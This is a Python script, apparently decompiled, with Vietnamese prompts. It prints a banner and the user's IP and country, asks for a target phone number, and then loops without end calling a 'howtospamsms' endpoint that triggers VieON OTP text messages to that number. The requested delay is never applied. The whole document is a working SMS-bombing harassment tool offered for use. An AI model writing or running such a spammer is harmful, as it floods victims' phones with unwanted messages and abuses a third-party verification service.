#decode by le quang dung:)
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
from calendar import weekheader
from time import sleep
import requests
stt=0
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle
try:
  from pystyle import Center, Anime, Colors, Colorate
except:
  os.system('pip install pystyle')
logo="""


████████╗██╗░░██╗░█████╗░███╗░░██╗  ░██████╗░██╗░░░██╗░█████╗░███╗░░██╗
╚══██╔══╝██║░░██║██╔══██╗████╗░██║  ██╔═══██╗██║░░░██║██╔══██╗████╗░██║
░░░██║░░░███████║███████║██╔██╗██║  ██║██╗██║██║░░░██║███████║██╔██╗██║
░░░██║░░░██╔══██║██╔══██║██║╚████║  ╚██████╔╝██║░░░██║██╔══██║██║╚████║
░░░██║░░░██║░░██║██║░░██║██║░╚███║  ░╚═██╔═╝░╚██████╔╝██║░░██║██║░╚███║
░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝  ░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝"""
print(Colorate.Diagonal(Colors.red_to_green, Center.XCenter(logo)))
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
Write.Print('Liên Hệ Facebook : none ( Zalo 0975660601  ) '+'\n' ,Colors.red_to_blue, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
Write.Print('IP của bạn: '+ip+'\n' ,Colors.red_to_blue, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
Write.Print('Location: '+loc+'\n' ,Colors.red_to_green, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
phone=Write.Input("Nhập SDT (Lưu Ý Bỏ Số 0 Ở Đầu): " ,Colors.red_to_green, interval=0.005)
time_delay = Write.Input('Time Delay: ' ,Colors.red_to_blue, interval=0.005)
Write.Print('==========================================================================='+'\n' ,Colors.red_to_green, interval=0.005)
while True:

    stt=stt+1
    requests.get(f'https://howtospamsms.herokuapp.com/vieon?phone=0{phone}')      
    Write.Print(f"[ {stt} ] [ qminh.log] => Sen OTP VieON"+" "+phone+"\n" ,Colors.red_to_green, interval=0.005)
    for i in range(1200, 0):
        pass
